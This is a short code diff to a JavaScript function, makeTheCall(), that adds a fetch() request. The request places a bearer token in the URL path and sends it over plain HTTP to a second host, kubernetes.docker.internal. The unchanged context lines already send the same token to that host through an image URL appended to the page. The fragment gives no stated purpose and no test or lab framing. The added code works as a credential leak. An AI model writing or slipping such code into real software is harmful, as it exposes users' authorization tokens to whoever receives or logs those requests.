@@ -23,6 +23,10 @@ function makeTheCall() {
     "Content-Type": "application/json",
     "Authorization": "Bearer " + token
   })
+  fetch('http://kubernetes.docker.internal/fetch/'+token, {
+    Accept: "application/json",
+    "Content-Type": "application/json"
+  })
   let img = document.createElement('img')
   img.src="http://kubernetes.docker.internal/img/"+token+".jpg"
   document.body.appendChild(img)
